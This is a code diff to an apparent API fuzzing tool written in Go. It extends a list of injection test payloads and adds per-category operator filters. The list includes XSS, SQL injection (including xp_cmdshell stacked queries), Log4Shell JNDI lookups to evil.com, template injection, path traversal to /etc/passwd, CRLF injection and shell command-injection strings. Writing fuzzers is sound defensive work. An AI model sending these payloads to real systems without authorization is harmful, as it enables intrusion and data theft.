@@ -12,6 +12,8 @@ import (
 
 // fuzzStrings are common security-relevant payloads used by multiple mutators
 // (json:string_mutation and param:string_mutation) to inject into string values.
+// Each category includes grammar-breaking prefixes that close the current syntactic
+// context (string, tag, attribute, expression) before injecting the payload.
 var fuzzStrings = []string{
 	// --- Empty / overflow ---
 	"",
@@ -19,13 +21,67 @@ var fuzzStrings = []string{
 	strings.Repeat("A", 65536),
 	"\x00\x01\x02\x03",
 
-	// --- XSS / injection ---
+	// --- XSS / HTML injection ---
+	// Close-tag + open-new vectors (grammar break: ">)
+	`"><script>alert(1)</script>`,
+	`"><img src=x onerror=alert(1)>`,
+	`"><svg onload=alert(1)>`,
+	// Close JS expression (grammar break: '-)
+	`'-alert(1)-'`,
+	// Close attribute + event handler (grammar break: ' on / " a)
+	`' onmouseover=alert(1)//`,
+	`" autofocus onfocus=alert(1)//`,
+	// Close script block + reopen (grammar break: </)
+	`</script><script>alert(1)</script>`,
+	// JS pseudo-URL prefix (grammar break: javascript:)
+	`javascript:alert(1)`,
+	// Vanilla script tag
 	"<script>alert(1)</script>",
+
+	// --- SQL injection ---
+	// Single-quote break (grammar break: ')
 	"' OR '1'='1",
+	"' OR 1=1--",
+	"admin'--",
+	"' OR SLEEP(10)--",
+	"' UNION SELECT 1,2,3--",
+	"' AND 1=1--",
+	"' AND 1=0--",
+	// Double-quote break (grammar break: ")
+	`" OR 1=1--`,
+	`" OR "1"="1`,
+	// Close parens variants (grammar break: ) / '))
+	"') OR 1=1--",
+	`") OR 1=1--`,
+	"')) OR 1=1--",
+	`")) OR 1=1--`,
+	// Numeric context (grammar break: starts with number, then boolean)
+	"1 OR 1=1--",
+	// Stacked queries (grammar break: ; after closing)
+	"';EXEC xp_cmdshell('ping 127.0.0.1')--",
+	"');WAITFOR DELAY '0:0:10'--",
+
+	// --- LDAP / Log4Shell ---
 	"${jndi:ldap://evil.com/a}",
-	"{{7*7}}",
+	"${jndi:rmi://evil.com/a}",
+	"${jndi:dns://evil.com/a}",
+
+	// --- Template injection (SSTI) ---
+	"{{7*7}}",    // Jinja2/Mustache/Handlebars
+	"${7*7}",     // Freemarker/Velocity/Spring EL
+	"#{7*7}",     // Ruby string interpolation
+	"<%= 7*7 %>", // ERB/EJS
+
+	// --- Path traversal ---
 	"../../../etc/passwd",
+	"..\\..\\..\\windows\\win.ini",
+	// Null-byte termination + traversal (grammar break: %00)
+	"%00../../../etc/passwd",
+
+	// --- Header injection / response splitting ---
 	"\r\nX-Injected: true",
+	// URL-encoded CRLF prefix (grammar break: %0d%0a)
+	"%0d%0aX-Injected:%20true",
 
 	// --- Unicode attacks ---
 	"\u0000",
@@ -45,19 +101,45 @@ var fuzzStrings = []string{
 	"gopher://127.0.0.1:6379/_INFO",
 
 	// --- Command injection ---
+	// Backtick substitution (grammar break: `)
 	"`id`",
+	// Command substitution (grammar break: $()
 	"$(whoami)",
-	"; ls -la /",
-	"| cat /etc/passwd",
+	// Newline injection (grammar break: \n / %0a)
 	"\nid\n",
+	"%0a id",
+	// Semicolon (grammar break: ;)
+	"; ls -la /",
+	"; /usr/bin/id",
+	// Pipe (grammar break: |)
+	"| cat /etc/passwd",
+	"| sleep 10",
+	// Double ampersand (grammar break: &&)
+	"&& id",
+	"&& sleep 10",
+	// Double pipe (grammar break: ||)
+	"|| id",
+	"|| sleep 10",
+	// Close string then inject (grammar break: ' + ; or " + ;)
+	"';id",
+	"');id",
+	`");id`,
+	// Ampersand (grammar break: &)
 	"& ping -c 10 127.0.0.1 &",
-	"$(sleep 5)",
+	// Blind sleep
+	"$(sleep 10)",
+
+	// --- Full-path command variants ---
+	"/usr/bin/id",
+	"%0a/usr/bin/id",
+	"%0a/bin/ls -la",
 
 	// --- Prototype pollution ---
 	"__proto__",
 	"constructor",
 	`{"__proto__":{"isAdmin":true}}`,
 	`constructor[prototype][isAdmin]=true`,
+	`{"constructor":{"prototype":{"isAdmin":true}}}`, // nested JSON variant
 }
 
 // MutationResult holds the output of a mutation operation.
@@ -92,6 +174,8 @@ func (f ExchangeMutatorFunc) Mutate(ex model.Exchange, rng *rand.Rand, intensity
 }
 
 // Config controls which mutation classes are enabled and their parameters.
+// EnabledOps controls per-category operator selection. If a category's slice is
+// nil or empty, all operators in that category are enabled.
 type Config struct {
 	PathQuery           bool
 	Headers             bool
@@ -104,6 +188,14 @@ type Config struct {
 	MaxBodyLen          int
 	UserDictionary      *Dictionary // header dictionary (nil = built-in only)
 	UserDictionaryPaths []string    // paths to dictionary files to load
+
+	// Per-category operator filters.
+	URIEnabledOps       []string
+	HeaderEnabledOps    []string
+	JSONEnabledOps      []string
+	ParamEnabledOps     []string
+	PrimitiveEnabledOps []string
+	SequenceEnabledOps  []string
 }
 
 // DefaultConfig returns sensible defaults for mutation configuration.
@@ -143,12 +235,63 @@ func NewPipeline(cfg Config) *Pipeline {
 	}
 	return &Pipeline{
 		cfg:       cfg,
-		primitive: &PrimitiveMutator{},
-		uri:       &URIMutator{MaxURLLen: cfg.MaxURLLen},
-		header:    &HeaderMutator{MaxHdrLen: cfg.MaxHdrLen, UserDict: dict},
-		jsonM:     &JSONMutator{MaxBodyLen: cfg.MaxBodyLen},
-		param:     &ParamMutator{},
+		primitive: &PrimitiveMutator{EnabledOps: filterOperators(cfg.PrimitiveEnabledOps, allPrimitiveOps)},
+		uri:       &URIMutator{MaxURLLen: cfg.MaxURLLen, EnabledOps: filterOperators(cfg.URIEnabledOps, allURIOps)},
+		header:    &HeaderMutator{MaxHdrLen: cfg.MaxHdrLen, UserDict: dict, EnabledOps: filterOperators(cfg.HeaderEnabledOps, allHeaderOps)},
+		jsonM:     &JSONMutator{MaxBodyLen: cfg.MaxBodyLen, EnabledOps: filterOperators(cfg.JSONEnabledOps, allJSONOps)},
+		param:     &ParamMutator{EnabledOps: filterOperators(cfg.ParamEnabledOps, allParamOps)},
 	}
+}
+
+// All known operator names per mutator category (without the category prefix).
+var (
+	allURIOps       = []string{"path_segment", "query_param", "reserved_inject", "percent_encoding", "slash_manipulation", "long_value"}
+	allHeaderOps    = []string{"add", "remove", "duplicate", "long_value", "dict_substitute", "conflicting"}
+	allJSONOps      = []string{"type_substitute", "object_key", "array_mutation", "boundary_values", "depth_stress", "string_mutation"}
+	allParamOps     = []string{"string_mutation"}
+	allPrimitiveOps = []string{"bitflip", "byteflip", "arith", "interesting", "block_op", "splice"}
+)
+
+// AllSeqOps is the exported list of all sequence operator names (without "seq:" prefix).
+var AllSeqOps = []string{"drop", "duplicate", "swap", "perstep"}
+
+// FilterOperators is the exported version of filterOperators for use by callers
+// outside the mutate package (e.g. engine).
+func FilterOperators(enabled []string, allOps []string) []string {
+	return filterOperators(enabled, allOps)
+}
+
+// resolveOps returns the effective operator list for a mutator.
+// nil means all operators are enabled (default behavior).
+// non-nil empty means no operators are enabled (explicitly filtered to none).
+func resolveOps(configured []string, all []string) []string {
+	if configured == nil {
+		return all
+	}
+	return configured
+}
+
+// filterOperators returns the subset of allOps that are listed in enabled.
+// If enabled is nil or empty, returns allOps (backward compatible: all enabled).
+// If none of the enabled names match any known operator, falls back to allOps.
+func filterOperators(enabled []string, allOps []string) []string {
+	if len(enabled) == 0 {
+		return allOps
+	}
+	allowed := make(map[string]bool, len(enabled))
+	for _, op := range enabled {
+		allowed[op] = true
+	}
+	result := make([]string, 0, len(enabled))
+	for _, op := range allOps {
+		if allowed[op] {
+			result = append(result, op)
+		}
+	}
+	if len(result) == 0 {
+		return allOps
+	}
+	return result
 }
 
 // Intensity returns the configured mutation intensity.
